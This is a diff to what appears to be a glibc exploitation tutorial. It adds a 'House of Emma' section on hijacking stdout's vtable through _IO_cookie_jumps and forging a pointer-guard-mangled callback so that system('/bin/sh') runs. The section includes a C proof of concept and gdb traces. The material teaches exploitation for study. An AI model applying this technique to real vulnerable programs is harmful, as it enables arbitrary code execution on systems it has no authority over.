@@ -1533,10 +1533,8 @@ or another less reliable write primitive.
 ------------------------------------------------------------------------------
 
 Concept of this technique was built on vtable validate doesn't exist for _wide_vtable from wide chars _IO_FILE.
-I didn't found any source of struct for "wide file stream" but it doesn't matter. 
-You just should know that size of this structure equals any standart stream struct (example for x86_64) :
-
-	sizeof(struct _IO_FILE) + sizeof(struct _IO_jump_t *) == 0xe0 + 0x8 == sizeof(struct _IO_FILE_plus)
+I didn't found any source of struct for _IO_wide_data but it doesn't matter. 
+You just should know that size of this structure larger than any standart stream struct (example for x86_64) with 16 bytes and equals 0xe8 (including _wide_vtable).
 	
 Fine, let's speak about architecture of key structs :
 
@@ -1639,6 +1637,182 @@ Fine, let's check it out with callstack dumps :
 		[#5] 0x7ffff7c836a9 → puts()
 		[#6] 0x55555555520a → main()
 		
+5.7 House of Emma
+------------------------------------------------------------------------------
+
+If you have writing primitive which can help you write to pages under libc pages
+or you have read primitive to read those pages + you have libc leak and arbitrary write primitive
+you can use this technique.
+
+Firstly let me explain what House of Emma exploits and how it works.
+
+_IO_cookie_file extends standart methods of _IO_FILE_plus via addition user's callbacks for different events :
+
+	struct _IO_cookie_file {
+	  struct _IO_FILE_plus __fp;		<== standart _IO_FILE_plus but with _IO_cookie_jump vtable
+	  void *__cookie;			<== cookie as the 1st argument to custom callbacks
+	  cookie_io_functions_t __io_functions;
+	};
+	
+	Where cookie_io_functions_t __io_functions is a structure which includes 4 mangled pointers to
+	user's defined callbacks : read (+ 0x0) ; write (+ 0x8) ; seek (+ 0x10) ; close (+ 0x18).
+	
+It can be reached with immediate fopencookie() in code but we're not talking about that now.
+You have to know the chain of calls from _IO_cookie_jump to __io_functions and what is a pointer guard :
+
+	1. When file stream detected any event it goes to it's own vtable _IO_cookie_jump, 
+	   where defined pointers to wrappers upper __io_functions (for example - write event)
+	2. It executes code at the _IO_cookie_jump + 0x78 pointer (_IO_cookie_write from vtable) :
+	
+		static ssize_t _IO_cookie_write (FILE *fp, const void *buf, ssize_t size) {
+		  struct _IO_cookie_file *f = (struct _IO_cookie_file *) fp;
+		  cookie_write_function_t *write_cb = f->__io_functions.write;	// offset + 0x8
+
+		/* now write_cb is a pointer with pointer guard protection (mangled) */
+
+		#ifdef PTR_DEMANGLE
+		  PTR_DEMANGLE (write_cb);	// demangle it to get raw pointer to write callback
+		#endif
+
+		  if (write_cb != NULL)
+		    return write_cb (f->__cookie, buf, size);	// call it with cookie at the 1st arg
+		  return size;
+		}
+		
+	3. As you can see, firstly we take write callback from __io_functions for write,
+	   but it mangled with pointer guard :
+	
+		PTR_MANGLE (n) <=> ROL(n ^ POINTER_GUARD, 0x11)
+		
+	   Where ROL is a rotate left (BITS is a count of bits in register on your arch) :
+	   
+	   	ROL (n, k) <=> ((n << k) | ((n >> (BITS - k))) & ((1 << BITS) - 1)
+	   	
+	   And pointer guard situated at $fs_base + 0x30 :
+	   	
+	   	gef➤  x/gx $fs_base + 0x30
+		0x7ffff7fb3770: 0xfca6d27b4c2dabde
+		
+	   And 0x7ffff7fb3770 from pages under libc :
+	   
+	   	0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /path/2/code
+		0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /path/2/code
+			...
+		0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /path/2/libc
+		0x00007ffff7c28000 0x00007ffff7dc0000 0x0000000000028000 r-x /path/2/libc
+			...
+		0x00007ffff7e14000 0x00007ffff7e21000 0x0000000000000000 rw- 
+		0x00007ffff7fb3000 0x00007ffff7fb8000 0x0000000000000000 rw- 	<== right here
+		0x00007ffff7fb8000 0x00007ffff7fbc000 0x0000000000000000 r-- [vvar]
+		0x00007ffff7fbc000 0x00007ffff7fbe000 0x0000000000000000 r-- [vvar_vclock]
+		0x00007ffff7fbe000 0x00007ffff7fc0000 0x0000000000000000 r-x [vdso]
+		0x00007ffff7fc0000 0x00007ffff7fc1000 0x0000000000000000 r-- /path/2/ld
+			...
+		0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
+		0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+		
+	   It's a random value for each process deploy,
+	   so, you must find a way how find it out or overwrite.
+	   
+	4. Now we need to bring it to shape with PTR_DEMANGLE (write_cb) :
+	
+		PTR_DEMANGLE (n) <=> ROR(n, 0x11) ^ POINTER_GUARD
+		
+	   Where ROR is a rotate right :
+	   
+	   	ROR(n, k) <=> ((n >> k) | (n << (BITS - k))) & ((1 << BITS) - 1)
+	   	
+	5. And finally, we call write_cb (f->__cookie, buf, size)
+	
+And how you could guess, we have to overwrite vtable to _IO_cookie_jumps which passes _IO_vtable_validate(),
+put after it argument to arbitrary code (as ususal address of b'/bin/sh\x00' for system), 
+place 4 mangled callbacks (but you actually can put just one relevant callback for your event)
+and solve the problem with pointer guard.
+
+This is my PoC for stdout manip (compiled with -o -g; run without ASLR; absolute addresses may be different) :
+
+	#include "stdio.h"
+
+	int main() {
+		/* _IO_cookie_jump + offset to reach _IO_cookie_write as __xputn & __cookie will be put to $rdi*/
+		long shifted_io_cookie_jump = 0x7ffff7e11420 + 0x40; 
+		char* __cookie = "/bin/sh\0";
+
+		long system = 0x7ffff7c00000 + 0x5c560;
+		long pointer_guard = *(long*)(0x7ffff7fb3740 + 0x30);
+
+		/* PTR_MANGLE(system) */
+		unsigned long mangled_sys = system ^ pointer_guard;
+		mangled_sys = ((mangled_sys << 0x11) | (mangled_sys >> (64 - 0x11)));
+
+		/* VULN */
+		*((long*)stdout + 27) = shifted_io_cookie_jump;
+		*((long*)stdout + 28) = (long)__cookie;
+		*((long*)stdout + 30) = (long)mangled_sys;
+
+		puts("sayhi");
+
+		return 0;
+	}
+
+And several little qualifications :
+
+	1. _IO_cookie_jumps isn't exported symbol from libc even if you loaded debug symbols.
+	   So, it placed in "glibc vtable range" as usual under _IO_wfile_jumps with offset
+	   (in glibc 2.43-2ubuntu2_amd64 it placed with _IO_wfile_jumps + 0x1f0)
+	2. stdout wasn't specified with fopencookie() so it uses "default" offsets in vtable
+	   for any event. For example, write event pulls __xputn with 0x38,
+	   but we need to pull _IO_cookie_write with 0x78 offset,
+	   so we just add 0x40 to _IO_cookie_jumps to reach what we need.
+	3. When you handle mangling with pointer guard be sure that you works in unsigned context
+	   otherwise you'll be faced with arithmetical shift right assembly instruction - sar.
+	   And if xor result of pointer and mangled ptr is negative in signed context,
+	   sar will drag signed bit for whole shift and you'll get something like 0xffffffffffffa92b.
+	   Just use unsigned context to use classic "shr" instead of "sar"
+	   
+Let's check it out (follow the source code of _IO_cookie_write) with callstacks :
+
+	stdout layout after overwriting :
+	
+		0x7ffff7e13580 <_IO_2_1_stdout_>:       0x00000000fbad2a84      0x000055555555b010
+			...
+		0x7ffff7e13650 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7e11460	<== shifted _IO_cookie_jumps
+		0x7ffff7e13660 <stderr>:        	0x0000555555556007      <== pointer to b'/bin/sh\x00'
+		0x7ffff7e13670 <stdin>: 		0x673097a23150e090      <== mangled write callback (system)
+
+	1. Get our shifted _IO_cookie_vtable :
+	
+		0x7ffff7c8eb90 <puts+0050>      mov    rax, QWORD PTR [rdi+0xd8], where $rdi is stdout
+		
+	   now $rax   : 0x00007ffff7e11460  →  0x00007ffff7c9d5d0  →  <_IO_default_xsgetn+0000> endbr64
+			
+		0x7ffff7c8ebb7 <puts+0077>      call   QWORD PTR [rax+0x38]
+		
+	   where $rax + 0x38 : 0x7ffff7e11498: 0x00007ffff7c8cbb0 - address of _IO_cookie_write
+	   
+	   	[#0] 0x7ffff7c8cbb0 → endbr64	<== _IO_cookie_write
+		[#1] 0x7ffff7c8ebba → puts()
+		[#2] 0x5555555551e7 → main()
+		
+	2. Execution of _IO_cookie_write :
+	
+		0x7ffff7c8cbb4                  mov    rax, QWORD PTR [rdi+0xf0] <== load mangled ptr
+		0x7ffff7c8cbbb                  ror    rax, 0x11		 <== 1st step unmangle
+		0x7ffff7c8cbbf                  xor    rax, QWORD PTR fs:0x30	 <== 2nd step unmangle
+		
+	   After unmangling $rax   : 0x00007ffff7c5c560  →  <system+0000> endbr64
+
+		0x7ffff7c8cbd7                  mov    rdi, QWORD PTR [rdi+0xe0] <== put __cookie to $rdi
+	   	0x7ffff7c8cbde                  call   rax
+	   	
+	3. And here we are :
+	
+		$rdi   : 0x0000555555556007  →  0x0068732f6e69622f ("/bin/sh"?)
+	
+		[#0] 0x7ffff7c5c560 → system()
+		[#1] 0x7ffff7c8cbe0 → cmp r12, rax
+		[#2] 0x7ffff7c8ebba → puts()
+		[#3] 0x5555555551e7 → main()
 	
 ================================================================================
 6. BONUS
